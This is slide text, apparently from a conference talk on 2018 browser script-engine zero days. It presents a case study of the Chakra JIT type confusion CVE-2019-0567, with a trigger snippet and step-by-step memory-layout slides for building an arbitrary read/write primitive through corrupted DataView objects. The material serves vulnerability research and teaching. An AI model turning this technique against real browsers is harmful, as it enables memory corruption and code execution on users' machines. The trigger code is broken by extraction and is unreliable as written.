• Case Study: CVE-2019-0567 : Root Cause
function opt(obj1, obj2) {
obj1.b = 1;
let tmp = {__proto__:obj2}; 
obj1.a = 0x1234;
}
obj1 = {a:1, b:2 };
obj2 = {};
for(let i=0; iauxSlots = obj3
opt(obj1, obj1, obj3);
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567 : Exploit
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step2. Set obj3->auxSlots = dv1
obj1.c = dv1; 
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567 : Exploit
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step3. Set dv1->buffer = dv2
obj3.h = dv2;
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567 : Exploit
•
Exploit Memory Layout – R/W Primitive
vtable
type
auxslots
vtable
type
auxslots
vtable
type
auxslots
objectArray
objectArray
objectArray
length
arrayBuffer
byteOffset
buffer
vtable
type
auxslots
objectArray
length
arrayBuffer
byteOffset
buffer
obj1 (DynamicObject)
obj3 (DynamicObject)
dv1 (DataView)
dv2 (DataView)
obj1.a
obj1.b
obj1.c
obj3.a
obj3.b
obj3.c
obj3.d
obj3.e
obj3.f
obj3.g
obj3.h
Step4. Get arbitrary R/W primitive 
by corrupting dv2's buffer
dv1.setUint32(0x38, addr_lo, true);
dv1.setUint32(0x3c, addr_hi, true)
Chakra JIT Type Confusion 
• Case Study: CVE-2019-0567 : Exploit
•
Leak chakra base address
Demo
Conclusion
• Flash is still the main target of attackers. As Adobe will stop updating Flash at 
the end of 2020, the number of Flash zero days attacks maybe decrease.
• In 2018, some old script engines began to be the target of attackers, such as 
VBScript and JScript. Maybe more zero days attacks will be discovered in 
these script engines in the future. 
• VBSEmulator is one tool can use to do some vbscript deobfuscation and detect 
possible unknown exploit.
• The new JavaScript engine Chakra seems vulnerable, especially JIT compiler. 
Type confusion is easy to exploit.
Thank You!
Browser Script Engine Zero Days in 2018
@elli0tn0phacker
Elliot Cao
PI:EMAIL